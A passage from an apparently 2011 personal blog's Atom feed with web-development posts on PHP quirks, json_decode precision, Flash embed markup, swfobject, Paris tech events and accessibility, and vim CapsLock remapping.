&lt;span class=&quot;x&quot;&gt;var_dump(compact(&amp;#39;a&amp;#39;, &amp;#39;b&amp;#39;, &amp;#39;c&amp;#39;, &amp;#39;d&amp;#39;));&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;array(4) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  [&amp;quot;a&amp;quot;]=&amp;gt;Â Â Â  bool(false)&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  [&amp;quot;b&amp;quot;]=&amp;gt;Â Â Â  bool(true)&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  [&amp;quot;c&amp;quot;]=&amp;gt;Â Â Â  bool(false)&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  [&amp;quot;d&amp;quot;]=&amp;gt;Â Â Â  bool(true)&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;$a OR $b&lt;/code&gt; in fact returns &lt;code&gt;$a&lt;/code&gt;, while &lt;code&gt;($a OR $b)&lt;/code&gt; returns the result of the
parenthesis. On the other hand, &lt;code&gt;$a || $b&lt;/code&gt; correctly returns the result of the
expression.&lt;/p&gt;

&lt;p&gt;It seems that &lt;code&gt;AND&lt;/code&gt;and &lt;code&gt;OR&lt;/code&gt;are weak compared to &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; and &lt;code&gt;||&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Be aware of that, or it might backfire on you. Or just discard all &lt;code&gt;AND&lt;/code&gt;/ &lt;code&gt;OR
&lt;/code&gt;in favor of &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; /&lt;code&gt;||&lt;/code&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Weird PHP behavior when casting as an object</title>
   <link href="http://blog.pixelastic.com/2011/11/28/weird-php-behavior-casting-object/"/>
   <updated>2011-11-28T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2011/11/28/weird-php-behavior-casting-object</id>
   <content type="html">&lt;p&gt;I&amp;#39;ve just stumbled upon that weird behavior when force casting the return of a
function to an object. The PHP result was not what I expected.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$a = null;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;echo empty($a) ? &amp;quot;Yes, I&amp;#39;m empty&amp;quot; : &amp;quot;You should not see this&amp;quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This is pretty straighforward code. Now, we test it with an object.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$a = (object) null;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;echo empty($a) ? &amp;quot;Yes, I&amp;#39;m empty&amp;quot; : &amp;quot;You should not see this but, actually, you do.&amp;quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note that it even gets weirder when &lt;code&gt;(object) false&lt;/code&gt; and &lt;code&gt;(object) true&lt;/code&gt;
become objects with a key &lt;code&gt;scalar&lt;/code&gt;, set to &lt;code&gt;false&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This is one of the little things that make me want to ditch PHP for a better
language.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Web and dev events in Paris</title>
   <link href="http://blog.pixelastic.com/2011/11/24/web-dev-events-paris/"/>
   <updated>2011-11-24T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2011/11/24/web-dev-events-paris</id>
   <content type="html">&lt;p&gt;For the past month or so, I&amp;#39;ve attended quite a bunch of dev and web events,
here in Paris.&lt;/p&gt;

&lt;p&gt;Every time I get back from one, I wanted to post something about it. But I
never did, as I always seems to have something more important to do. That&amp;#39;s
quite a shame, because those events were (for the most part) really
interesting, some were even really motivating.&lt;/p&gt;

&lt;p&gt;So, expect a full blog post on each of them in the coming days. For the time
being, here is just an overview.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.paris-web.fr/&quot;&gt;Paris Web&lt;/a&gt; is THE french web event. Two days of
conferences about the web, not too technical, but very practical. Here we
speak equally about the &amp;quot;why&amp;quot; than about the &amp;quot;how&amp;quot;. Very great speakers, team
and place. The third day is for workshops, in smaller groups.&lt;/p&gt;

&lt;p&gt;Then comes &lt;a href=&quot;http://parisjs.org/&quot;&gt;Paris JS&lt;/a&gt;, held each month. It&amp;#39;s an evening
of informal talks about Javascript, a few speakers will demo an app, a
framework, or talk about anything JS related. Very great to meet interesting
JS fellows, and exchange about frameworks and projects.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://parishackers.org/&quot;&gt;Paris Hacker&lt;/a&gt; is an other informal event, where
everyone is free to speak about any hacky/geeky subject. Most of the time we
review the last Hacker news posts and discuss them, talk about incoming
events, and so on. There almost no trolling. Most of the time.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://js-attitude.fr/js-guru/&quot;&gt;JsGuru&lt;/a&gt; is a completly different kind of
event. This one is a one-day Javascript formation. It costs real money this
time, but you got to learn a few tricks and get your started on some
frameworks and libraries like Backbone, Mustache, Lawnchair, etc.&lt;/p&gt;

&lt;p&gt;And the final one is the &lt;a href=&quot;http://hackdayparis.org/&quot;&gt;Hack Day Paris&lt;/a&gt;. Partially
organized by the same team as Paris Hacker, it was a 40hrs hackathon, with no
constraint except to &amp;quot;build something brilliant&amp;quot;. More than 180 fellow geeks
attended, and 43 projects were finally demoed on stage. This was one of the
most motivating experience I ever did.&lt;/p&gt;

&lt;p&gt;A few days after the Hack Day, an other event was held by SFR were all the
Hack Day participants were invited. Along with participant from two other
events (Designer Weekend and Museomix), the goal was to help all those people
to meet, and to showcase some of SFR latest innovation. This is clearly the
event that I liked less.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Paris Web 2011 : Accessibility</title>
   <link href="http://blog.pixelastic.com/2011/11/24/paris-web-2011-accessibility/"/>
   <updated>2011-11-24T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2011/11/24/paris-web-2011-accessibility</id>
   <content type="html">&lt;p&gt;In October, I was attending the Paris Web event. For those that haven&amp;#39;t heard
of it, it is THE french web event, two days of conference on various subjects
web related. It is language agnostic and talks range a very broad list of
topics from accessibility, open data, security, performance, UX, UI, html5,
etc.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve attended 16 talks in the course of the event, plus a full day of
workshops. I would need far more than a single post to write down everything I
learn from those days, both technical and human. I really love Paris Web for
those moments where you start to chat with other peoples as passionate as you
are.&lt;/p&gt;

&lt;p&gt;Here, I&amp;#39;ll only focus on a specific subject that everyone cared about :
Accessibility.&lt;/p&gt;

&lt;h2&gt;Know your audience&lt;/h2&gt;

&lt;p&gt;Accessibility was discussed at length, as it always is the case in Paris Web.
It is one of the values held by Paris Web that I also hold dear. My only
regret is that it feels like everyone in Paris Web attendee were already
familiar with it, had implemented at least the basic good practices, that we
all were already convinced of why it is good. I kind of feel that were not the
right public, that the speech was wasted on us as we already were convinced.&lt;/p&gt;

&lt;p&gt;We, as web professional, are aware of the accessibility concerns. Big groups
and public websites are aware of it too. But the middle ground of small
companies do not care. &amp;quot;This is not our target&amp;quot;, &amp;quot;Spending 40% more for 10% of
users ? No way&amp;quot;, &amp;quot;We are not big enough&amp;quot;, are answers I&amp;#39;ve often heard when
trying to explain to clients why I cared about aspects of their projects they
didn&amp;#39;t even see.&lt;/p&gt;

&lt;h2&gt;Continuous integration&lt;/h2&gt;

&lt;p&gt;Laurent Denis and Elie Sloèª°m told us that accessibility should not be thought
as the last part of a project, the one we do the day before launch. It has to
be taken into account for the very start of the project, in the conception
phase, and not at the end, as a correction phase.&lt;/p&gt;

&lt;p&gt;Every person ever included in the project should be at least aware of the
accessibility concern, this is not the work of one man alone. Accessibility
experts are not people you can hire to fix your website once it&amp;#39;s done. They
should be requestd during all the conception phase.&lt;/p&gt;

&lt;p&gt;No one ever read the 100 page accessibility audit. No one wants to be told at
the end of the project that what they did is wrong and that they should start
everything over from scratch. Instead, mini briefs, on mini subjects,
sometimes no longer than 15mn, on a regular basis can yield very great
results. Starting with the general website semantic, adding unobstrusive
javascript, and going deeper and deeper into tasks more and more difficult.&lt;/p&gt;

&lt;p&gt;There is no perfection in accessibility. There&amp;#39;s only an ideal we tend to. You
don&amp;#39;t fix a website for accessibility, you just improve it.&lt;/p&gt;

&lt;h2&gt;Throw away formal accreditations&lt;/h2&gt;

&lt;p&gt;We can&amp;#39;t make a website absolutly perfect, we can just improve it on little
touches to make it better and better. A, AA and AAA homologation is absurd,
because there is no metrics to quantify the level of accessibility of a
website. How could you compare two accessibility features ? How video
subtitles is more accessible than alt on images ? We should just forget the
accreditations. At first, we did accessibility improvement to help people with
disabilities. Somewhere along the years, we became legally forced to provide
accessibility measures and it became one more line on the planning and we lost
the initial meaning that was driving us.&lt;/p&gt;

&lt;p&gt;We should really take accessibility down that pedestal we put it. It&amp;#39;s not
that hard to make an accessible website, don&amp;#39;t be scared by the list of
accreditation and rules.&lt;/p&gt;

&lt;h2&gt;What about HTML5 ?&lt;/h2&gt;

&lt;p&gt;The geek side of your mind can&amp;#39;t stop feeling the excitation when everyone
talks about all the shiny stuff : file API, history, geolocation, web sockets,
forms, etc. But the eternal question remains : what good are those new toys if
we can only serve them to a handful of users. Will I use them now, for the
benefit of only some, or will I wait for better support for the benefit of all
? But if I don&amp;#39;t promote them myself, I&amp;#39;m only slowing down adoption by all
browsers...&lt;/p&gt;

&lt;p&gt;That&amp;#39;s a tricky question and I don&amp;#39;t have a definite answer (and that&amp;#39;s fine
!).&lt;/p&gt;

&lt;p&gt;Paul Bakaus posted recently and article where he stated that it is better to
build something awesome for 70% of the people that something good for 95% of
them. It surely is true in the gaming world where gamers have the habit of
buying new hardware to keep with the new game graphics. In the classical web
world, we are still scared of asking the user to change its browser.&lt;/p&gt;

&lt;p&gt;But it tickles my accessibility sense when someone told me that a part of the
users won&amp;#39;t be able to access the content because they don&amp;#39;t have the correct
requirement. This feels absolutly contrary to the open web principles.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Getting list of Facebook friends from a test account</title>
   <link href="http://blog.pixelastic.com/2011/11/23/list-facebook-friends-test-account/"/>
   <updated>2011-11-23T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2011/11/23/list-facebook-friends-test-account</id>
   <content type="html">&lt;p&gt;To get the list of friends of a specific user, you are supposed to issue a
simple &lt;code&gt;GET&lt;/code&gt;request to &lt;code&gt;me/friends&lt;/code&gt; (or &lt;code&gt;USER_ID/friends&lt;/code&gt;), passing the user
accessToken in the request.&lt;/p&gt;

&lt;p&gt;Facebook used to return an array named &lt;code&gt;data&lt;/code&gt; where each value is an object
representing a friend. Each of this objects had two keys : &lt;code&gt;id&lt;/code&gt;and &lt;code&gt;name&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Until yesterday, it worked well.&lt;/p&gt;

&lt;p&gt;Today, it seems broken for test users. The &lt;code&gt;name&lt;/code&gt;key is no longer returned in
the call, you only get &lt;code&gt;id&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I&amp;#39;m not sure it&amp;#39;s intentionnal or not. At least I haven&amp;#39;t seen any notice
about this change. But I&amp;#39;m not sure it&amp;#39;s a bug either, as Facebook
documentation is crappy, we never really know if the output we got is the
expected one or if it&amp;#39;s a bug.&lt;/p&gt;

&lt;p&gt;I&amp;#39;m not even sure we were supposed to get the &lt;code&gt;name&lt;/code&gt;in the first place,
actually.&lt;/p&gt;

&lt;p&gt;What is definitely a bug is that the behavior is different for test users that
for classic users.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Passing flashVars with Flash 10 in IE</title>
   <link href="http://blog.pixelastic.com/2011/10/31/passing-flashvars-flash-10/"/>
   <updated>2011-10-31T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2011/10/31/passing-flashvars-flash-10</id>
   <content type="html">&lt;p&gt;I&amp;#39;ve spent the last two days debugging a weird issue involving https, IE and
Flash.&lt;/p&gt;

&lt;p&gt;In the end, I boiled the issue down to IE and Flash 10, https wasn&amp;#39;t involved
(in fact, that was a different issue).&lt;/p&gt;

&lt;h2&gt;Markup hell&lt;/h2&gt;

&lt;p&gt;It is known that to have a real crossbrowser markup to embed Flash we need an
IE specific version and a non-IE one.&lt;/p&gt;

&lt;p&gt;What I didn&amp;#39;t know was that &lt;code&gt;flashvars&lt;/code&gt;needed to be passed in two different
formats between Flash player 10 and Flash player 11.&lt;/p&gt;

&lt;p&gt;11 expect the classic &lt;code&gt;flashvars&lt;/code&gt;parameter while 10 expect them to be passed
as simili GET parameters to the movie url.&lt;/p&gt;

&lt;h2&gt;Final HTML markup&lt;/h2&gt;

&lt;p&gt;In the end, here is the PHP code I use to generate my SWF markup :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;sprintf(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  &amp;#39;&amp;lt;object classid=&amp;quot;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&amp;quot; width=&amp;quot;%1$s&amp;quot; height=&amp;quot;%2$s&amp;quot; id=&amp;quot;%3$s&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;param name=&amp;quot;movie&amp;quot; value=&amp;quot;%4$s?%6$s&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    %5$s&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;!--[if !IE]&amp;gt;--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      &amp;lt;object type=&amp;quot;application/x-shockwave-flash&amp;quot; data=&amp;quot;%4$s&amp;quot; width=&amp;quot;%1$s&amp;quot; height=&amp;quot;%2$s&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      %5$s&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;!--&amp;lt;![endif]--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    %7$s&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;!--[if !IE]&amp;gt;--&amp;gt;&amp;lt;/object&amp;gt;&amp;lt;!--&amp;lt;![endif]--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  &amp;lt;/object&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$width, $height, $id, $url, $params, $flashVars, $alternateContent);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Where :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$width&lt;/code&gt; and &lt;code&gt;$height&lt;/code&gt; are the size (in pixel) of your movie&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$id&lt;/code&gt; is the html/css id of the main object element (as used in &lt;code&gt;swfObject.getObjectById&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$url&lt;/code&gt; is the url address of your swf file&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$params&lt;/code&gt; is a string containing all the &lt;code&gt;&amp;lt;param name=&amp;quot;name&amp;quot; value=&amp;quot;value&amp;quot; /&amp;gt;&lt;/code&gt; that you want to pass. Usually it will contain the &lt;code&gt;wmode&lt;/code&gt;, &lt;code&gt;allowfullscreen&lt;/code&gt;, &lt;code&gt;allowscriptaccess&lt;/code&gt;and &lt;code&gt;flashvars&lt;/code&gt;keys.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$flashVars&lt;/code&gt; is a duplicate of the &lt;code&gt;flashVars&lt;/code&gt;key of &lt;code&gt;$params&lt;/code&gt; and should contain a string in the form &lt;code&gt;foo=bar&amp;amp;baz=nyan&lt;/code&gt; to be passed to the swf in Flash 10&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$alternateContent&lt;/code&gt; is the html text to be displayed when Flash is not installed in the browse&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I hope that this markup will help you, because I spent a damn long time
testing all that stuff, jungling between VM and IE instances.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title> swfobject.getObjectById() when flash not installed</title>
   <link href="http://blog.pixelastic.com/2011/10/28/swfobject-getobjectbyid-flash-installed/"/>
   <updated>2011-10-28T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/10/28/swfobject-getobjectbyid-flash-installed</id>
   <content type="html">&lt;p&gt;SWFObject is the de-facto library used whenever you need to ember Flash files
in your code. It takes care of smoothing all cross browser issues.&lt;/p&gt;

&lt;p&gt;It has a &lt;code&gt;getFlashPlayerVersion&lt;/code&gt;method that return a string of the current
version in the form &lt;code&gt;major.minor.release&lt;/code&gt;. Its value is &lt;code&gt;0.0.0&lt;/code&gt; if Flash isn&amp;#39;t
installed.&lt;/p&gt;

&lt;p&gt;It also provides a cross browser markup, including conditionnal comments for
IE, that validate and works everywhere. The downside is that it forces you to
create two elements in your markup with the same id.&lt;/p&gt;

&lt;p&gt;Hopefully, the &lt;code&gt;getObjectById&lt;/code&gt;method is here to return the correct DOM
element based on the browser flash integration type.&lt;/p&gt;

&lt;p&gt;But... It seems that the mechanisme is buggy when Flash isn&amp;#39;t installed (on
2.2)&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve tested running IE9 without Flash installed and FF8 with Flash disabled,
and the return of &lt;code&gt;getObjectById&lt;/code&gt;differs : I got &lt;code&gt;null&lt;/code&gt;in IE9 and the DOM
element in FF8.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve added a small patch to my code to take it into account :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;el&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;swfobject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getObjectById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And I&amp;#39;ve also submitted a &lt;a href=&quot;http://code.google.com/p/swfobject/issu%0Aes/detail?id=599&amp;amp;thanks=599&amp;amp;ts=1319792868&quot;&gt;bug report&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Fix the floating issue with json_decode in PHP 5.3</title>
   <link href="http://blog.pixelastic.com/2011/10/12/fix-floating-issue-json-decode-php-5-3/"/>
   <updated>2011-10-12T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/10/12/fix-floating-issue-json-decode-php-5-3</id>
   <content type="html">&lt;p&gt;When dealing with online API that are handling a lot of items (like Twitter or
Facebook), you&amp;#39;d better be aware of a PHP limitation with &lt;code&gt;json_decode&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;json_decode&lt;/code&gt; is supposed to take a JSON string and return a PHP array or a
PHP object from it.&lt;/p&gt;

&lt;p&gt;Unfortunatly if one of the key is an int and is bigger than the max int value,
it will be cast as float instead. And you&amp;#39;ll lose precision in the process.&lt;/p&gt;

&lt;p&gt;In my case it resulted in a complete unability to find a user in the database
as the id didn&amp;#39;t match anything. This was quite hard to find as I couldn&amp;#39;t
reproduce it on my local machine.&lt;/p&gt;

&lt;h2&gt;Know your system&lt;/h2&gt;

&lt;p&gt;My local system was a 64bits machine while the production servers were 32bits.
And of course, max int precision is far bigger on 64bits machines so the error
didn&amp;#39;t pop in my tests.&lt;/p&gt;

&lt;p&gt;If you&amp;#39;re running PHP 5.4, the fix is easy. Just add the
&lt;code&gt;JSON_BIGINT_AS_STRING&lt;/code&gt; bitmask as 4th option like this&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$decoded = json_decode($encoded, true, null, JSON_BIGINT_AS_STRING);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you&amp;#39;re running a 32bits machine with PHP 5.3 like me, it&amp;#39;s a little more
tricky.&lt;/p&gt;

&lt;h2&gt;The regexp&lt;/h2&gt;

&lt;p&gt;My solution is to parse the original JSON string and add quotes around ints so
&lt;code&gt;json_decode&lt;/code&gt; will keep them as string.&lt;/p&gt;

&lt;p&gt;My first attempt was naive&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;preg_replace(&amp;#39;/&amp;quot;:([0-9]+),/&amp;#39;, &amp;#39;&amp;quot;:$1,&amp;#39;, $encoded)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This will find any int between &lt;code&gt;&amp;quot;:&lt;/code&gt; (marking the end of a key) and &lt;code&gt;,&lt;/code&gt;
(marking the start of the next key), and replace it with the same string but
enclosed in quotes.&lt;/p&gt;

&lt;p&gt;I soon found out that this did not cover all the cases, especially if the int
key was the last of the JSON, it won&amp;#39;t be followed by a &lt;code&gt;,&lt;/code&gt; but by a &lt;code&gt;}&lt;/code&gt;
instead.&lt;/p&gt;

&lt;p&gt;So, I adapted it a little bit :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;preg_replace(&amp;#39;/&amp;quot;:([0-9]+)(,|})/&amp;#39;, &amp;#39;&amp;quot;:&amp;quot;$1&amp;quot;$2&amp;#39;, $encoded)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, it worked better. Any int key in the JSON, anywhere will be enclosed in
quotes.&lt;/p&gt;

&lt;p&gt;It was a little overkill so I decided to limit it to keys of at least 10
digits&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;preg_replace(&amp;#39;/&amp;quot;:([0-9]{10,})(,|})/&amp;#39;, &amp;#39;&amp;quot;:&amp;quot;$1&amp;quot;$2&amp;#39;, $encoded)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Better. But still not perfect.&lt;/p&gt;

&lt;p&gt;As I soon discovered, sometimes Facebook returned JSON containing JSON itself
(in Request &lt;code&gt;data&lt;/code&gt;or Credit &lt;code&gt;order_info&lt;/code&gt; for example).&lt;/p&gt;

&lt;p&gt;The previous approach would add quotes around ints in JSON escaped string and
would thus corrupt the whole key.&lt;/p&gt;

&lt;p&gt;This time, I added a final touch. I only added quotes around int that were not
in an escaped JSON string themselves, by checking that the closing quote of
the key wasn&amp;#39;t escaped.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;preg_replace(&amp;#39;/([^\\\])&amp;quot;:([0-9]{10,})(,|})/&amp;#39;, &amp;#39;$1&amp;quot;:&amp;quot;$2&amp;quot;$3&amp;#39;, $encoded)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here it is, the final fix. I might have forgotten some corner cases, but at
least it works for my current application.&lt;/p&gt;

&lt;p&gt;Hope it helps !&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Accessing a frame with Firebug console</title>
   <link href="http://blog.pixelastic.com/2011/10/11/accessing-frame-firebug-console/"/>
   <updated>2011-10-11T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/10/11/accessing-frame-firebug-console</id>
   <content type="html">&lt;p&gt;If you want to access the Javascript console of an inner frame of a webpage,
know that you can &amp;quot;browse&amp;quot; through the window as you could browse through a
file system.&lt;/p&gt;

&lt;p&gt;For example, if you want Firebug to use the first frameof the page as its
current window object, just type the following code in Firebug console :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;nx&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;frames&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This proved immensely useful when debugging a Facebook application.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Toggling insert/normal mode in vim with CapsLock</title>
   <link href="http://blog.pixelastic.com/2011/10/09/toggling-insert-normal-mode-vim-capslock/"/>
   <updated>2011-10-09T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/10/09/toggling-insert-normal-mode-vim-capslock</id>
   <content type="html">&lt;p&gt;You know that CapsLock key on your keyboard ? The sole usage of this key is to
SHOUT ON TEH INTERNETSÂ§Â§Â§.Â I decided to disable it completly as I never use it
on purpose.&lt;/p&gt;

&lt;p&gt;I also wanted to use it in vim to toggle between normal and insert mode with
one key instead of the default &lt;code&gt;i&lt;/code&gt;/&lt;code&gt;Esc&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;Disabling CapsLock&lt;/h2&gt;

&lt;p&gt;Disabling CapsLock is a fairly straightforward process. The xmodmap program is
responsible for binding keyboard events to your software and you can change
the default behavior by creating an &lt;code&gt;~/.Xmodmap&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;Just put the following code in it and the pressing the CapsLock key will no
longer block your next keys in Caps.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;clear Lock
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Catching it in vim&lt;/h2&gt;

&lt;p&gt;Now, to get it in vim, you&amp;#39;ll have a little more work to do. First, CapsLock
is not one of the default vim keycodes, so you won&amp;#39;t be able to remap it to
any useful function. To use it in vim, we will hook it directly on xmodmap to
another key, one that is part of vim default keycodes.&lt;/p&gt;

&lt;p&gt;I choose the virtual F13 key. Your physical keyboard might only have F keys
from 1 to 12, but the internal software seems to be able to react to 37 of
them. So, why not using them ?&lt;/p&gt;

&lt;p&gt;In your &lt;code&gt;~/.Xmodmap&lt;/code&gt; file, this is as easy as adding the following line&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;keycode 66 = F13
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;66 is the internal code for the CapsLock key. We just define that pressing the
physical CapsLock key should trigger the F13 virtual key.&lt;/p&gt;

&lt;p&gt;Now, in &lt;code&gt;~/.vimrc&lt;/code&gt;, we will tell vim to explictly listen to extended F keys
(from 13 to 37) which it does not do by default.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-vim&quot; data-lang=&quot;vim&quot;&gt;&lt;span class=&quot;k&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;F13&lt;span class=&quot;p&quot;&gt;&amp;gt;=&lt;/span&gt;^[[&lt;span class=&quot;m&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;~&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;^[[25~&lt;/code&gt; is the special keyboard code sent to vim when the F13 key is
triggered. Here we just define that such a keyboard code should be interpreted
in vim as an &lt;code&gt;&amp;lt;F13&amp;gt;&lt;/code&gt; vim key.&lt;/p&gt;

&lt;p&gt;Now, you can use &lt;code&gt;&amp;lt;F13&amp;gt;&lt;/code&gt; in your custom vim mappings&lt;/p&gt;

